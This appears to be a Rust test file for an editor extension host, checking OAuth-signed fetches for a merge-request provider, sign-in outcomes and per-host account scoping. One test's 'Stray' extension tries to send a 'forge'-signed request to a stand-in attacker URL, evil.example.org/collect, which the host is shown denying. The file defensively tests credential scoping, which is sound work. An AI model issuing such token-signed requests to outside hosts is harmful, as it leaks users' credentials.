//! A pull request provider against the mock host: its forge calls go through `auth` fixtures, unset handlers answer
//! as documented, and an unknown provider says how to register it.

use codeyard_extension::native::Call;
use codeyard_extension::prelude::*;
use codeyard_extension::pulls::{PullAnswer, PullQuery};

use crate::MockHost;

const MANIFEST: &str = r#"
[extension]
id      = "you.forge"
version = "0.1.0"
name    = "Forge"
license = "MIT"

[code]
entry = "Cargo.toml"

[permissions]
auth = ["forge"]
why  = "Lists merge requests."

[[oauth]]
id            = "forge"
name          = "Forge"
authorize-url = "https://forge.example.com/oauth/authorize"
token-url     = "https://forge.example.com/oauth/token"
client-id     = "x"
hosts         = ["forge.example.com"]

[[pull-requests]]
id    = "forge"
label = "Forge"
hosts = ["forge.example.com"]
auth  = "forge"
"#;

struct Forge;

impl Extension for Forge {
    fn activate(ctx: Context) -> Result<()> {
        ctx.pull_requests("forge")
            .list(async |ctx, remote| {
                let url = format!("https://forge.example.com/api/{}/merge_requests", remote.path);
                let text = ctx.fetch_as(remote.account.as_deref().unwrap_or_default(), Request::get(&url)).await?.text()?;
                Ok(text
                    .lines()
                    .map(|l| PullRequest { id: l.into(), reference: format!("!{l}"), title: format!("Request {l}"), ..Default::default() })
                    .collect())
            })
            .details(async |_ctx, _remote, id| Ok(PullRequestDetails { description: format!("About **{id}**"), ..Default::default() }))
            .files(async |_ctx, _remote, _id| Ok(vec![ChangedFile { path: "a.rs".into(), ..Default::default() }]))
            .contents(async |_ctx, _remote, _id, file| Ok(FileContents { base: None, head: Some(file.path) }))
            .checkout(async |_ctx, _remote, id| {
                Ok(Checkout { fetch_url: None, reference: format!("refs/merge-requests/{id}/head"), branch: format!("mr-{id}") })
            });
        Ok(())
    }
}

fn remote(provider: &str) -> Remote {
    Remote {
        provider: provider.into(),
        name: "origin".into(),
        url: "git@forge.example.com:team/app.git".into(),
        host: "forge.example.com".into(),
        path: "team/app".into(),
        account: Some("forge".into()),
    }
}

#[test]
fn a_provider_lists_through_auth_and_answers_each_query() {
    let host = MockHost::new();
    host.manifest(MANIFEST);
    host.http("GET", "https://forge.example.com/api/team/app/merge_requests", 200, "4\n9\n");
    host.activate::<Forge>().unwrap();

    let list = host.list_pull_requests(remote("forge")).unwrap();
    assert_eq!(list.iter().map(|p| p.reference.as_str()).collect::<Vec<_>>(), ["!4", "!9"]);
    // Signed by the host: the extension's request names the provider and carries no authorization of its own.
    let fetches: Vec<_> = host.calls().into_iter().filter(|c| matches!(c, Call::AuthFetch { .. })).collect();
    assert!(matches!(&fetches[..], [Call::AuthFetch { provider, request }] if provider == "forge" && request.headers.is_empty()));

    let r = || remote("forge");
    assert!(matches!(host.pull_requests(PullQuery::Details(r(), "4".into())), Ok(PullAnswer::Details(d)) if d.description == "About **4**"));
    assert!(matches!(host.pull_requests(PullQuery::Files(r(), "4".into())), Ok(PullAnswer::Files(f)) if f[0].path == "a.rs"));
    let file = ChangedFile { path: "a.rs".into(), ..Default::default() };
    assert!(matches!(host.pull_requests(PullQuery::Contents(r(), "4".into(), file)), Ok(PullAnswer::Contents(c)) if c.head.as_deref() == Some("a.rs")));
    assert!(matches!(host.pull_requests(PullQuery::Checkout(r(), "4".into())), Ok(PullAnswer::Checkout(c)) if c.branch == "mr-4"));
    // No comments handler: none to show, and adding one is refused.
    assert_eq!(host.pull_requests(PullQuery::Comments(r(), "4".into())), Ok(PullAnswer::Comments(vec![])));
    assert!(matches!(host.pull_requests(PullQuery::AddComment(r(), "4".into(), "hi".into())), Err(Error::Invalid(m)) if m.contains("does not take comments")));
    // A provider the extension did not register.
    let err = host.list_pull_requests(remote("other")).unwrap_err();
    assert!(err.to_string().contains("ctx.pull_requests(\"other\")"), "{err}");
}

struct Stray;

impl Extension for Stray {
    fn activate(ctx: Context) -> Result<()> {
        ctx.command("elsewhere", async |ctx, _args| {
            ctx.fetch_as("forge", Request::get("https://evil.example.org/collect")).await?;
            Ok(Value::Null)
        });
        ctx.command("own-header", async |ctx, _args| {
            ctx.fetch_as("forge", Request::get("https://forge.example.com/api/me").header("Authorization", "Bearer mine")).await?;
            Ok(Value::Null)
        });
        Ok(())
    }
}

#[test]
fn auth_fetch_signs_only_for_the_providers_hosts_and_without_an_authorization_of_its_own() {
    let host = MockHost::new();
    host.manifest(MANIFEST);
    host.http("*", "https://evil.example.org/collect", 200, "");
    host.http("*", "https://forge.example.com/api/me", 200, "");
    host.activate::<Stray>().unwrap();

    let err = host.command("elsewhere", Value::Null).unwrap_err();
    assert!(matches!(&err, Error::Denied(_)), "{err}");
    assert_eq!(host.denied()[0].permission, r#"[[oauth]] forge hosts = ["evil.example.org"]"#);
    // #183: the fix names the `[[oauth]]` table, not the `auth` line the manifest already has.
    assert!(err.to_string().contains(r#"fix: add "evil.example.org" to hosts in the [[oauth]] table with id = "forge""#), "{err}");
    let err = host.command("own-header", Value::Null).unwrap_err();
    assert!(matches!(&err, Error::Invalid(m) if m.contains("authorization header is added by Codeyard")), "{err}");
    assert!(host.fetched().is_empty(), "neither request was sent");
}

struct Signer;

impl Extension for Signer {
    fn activate(ctx: Context) -> Result<()> {
        ctx.command("me", async |ctx, _args| {
            let who = ctx.session("forge", &[]).await?;
            let res = ctx.fetch_as("forge", Request::get("https://forge.example.com/api/me")).await?;
            Ok(json!({ "label": who.label, "status": res.status }))
        });
        ctx.command("fetch-only", async |ctx, _args| Ok(json!(ctx.fetch_as("forge", Request::get("https://forge.example.com/api/me")).await?.status)));
        Ok(())
    }
}

/// #185: a declined sign-in and a signed-out account, as Codeyard reports them.
#[test]
fn sign_in_outcomes() {
    let host = MockHost::new();
    host.manifest(MANIFEST);
    host.http("GET", "https://forge.example.com/api/me", 200, "{}");
    host.activate::<Signer>().unwrap();
    assert_eq!(host.command("me", Value::Null).unwrap(), json!({ "label": "test-user", "status": 200 }));

    host.decline_sign_in("forge");
    assert!(matches!(host.command("me", Value::Null), Err(Error::Cancelled)), "the user picked Cancel");
    assert!(matches!(host.command("fetch-only", Value::Null), Err(Error::Invalid(m)) if m == "not signed in to Forge; call auth.session with “forge” first"));

    host.signed_out("forge");
    let err = host.command("fetch-only", Value::Null).unwrap_err();
    assert!(err.to_string().contains("not signed in to Forge"), "{err}");
    // The next session asks again, and this time the user agrees.
    assert_eq!(host.command("me", Value::Null).unwrap(), json!({ "label": "test-user", "status": 200 }));

    host.sign_in("forge", "ada");
    assert_eq!(host.command("me", Value::Null).unwrap(), json!({ "label": "ada", "status": 200 }));
    assert!(host.denied().is_empty());
}

/// #184: an instance's account (`forge@git.corp.example`) is granted by `auth = ["forge"]` once the user added it, and
/// signs requests to its own host only.
#[test]
fn an_instance_account_signs_its_own_host_only() {
    let host = MockHost::new();
    host.manifest(MANIFEST);
    host.http("GET", "https://git.corp.example/api/me", 200, "{}");
    host.http("GET", "https://forge.example.com/api/me", 200, "{}");
    host.activate::<Instance>().unwrap();
    let get = |url: &str| host.command("get", json!(["forge@git.corp.example", url]));
    // Not added yet: Codeyard refuses the account.
    assert!(matches!(get("https://git.corp.example/api/me"), Err(Error::Denied(d)) if d.permission == r#"auth = ["forge"]"#));
    host.instance("forge", "git.corp.example");
    assert_eq!(get("https://git.corp.example/api/me").unwrap(), json!(200));
    assert!(
        matches!(get("https://forge.example.com/api/me"), Err(Error::Denied(d)) if d.permission == r#"[[oauth]] forge@git.corp.example hosts = ["forge.example.com"]"#)
    );
    assert_eq!(host.fetched().len(), 1);
}

struct Instance;

impl Extension for Instance {
    fn activate(ctx: Context) -> Result<()> {
        ctx.command("get", async |ctx, args| {
            let (account, url) = (args[0].as_str().unwrap_or_default().to_string(), args[1].as_str().unwrap_or_default().to_string());
            ctx.session(&account, &[]).await?;
            Ok(json!(ctx.fetch_as(&account, Request::get(url)).await?.status))
        });
        Ok(())
    }
}
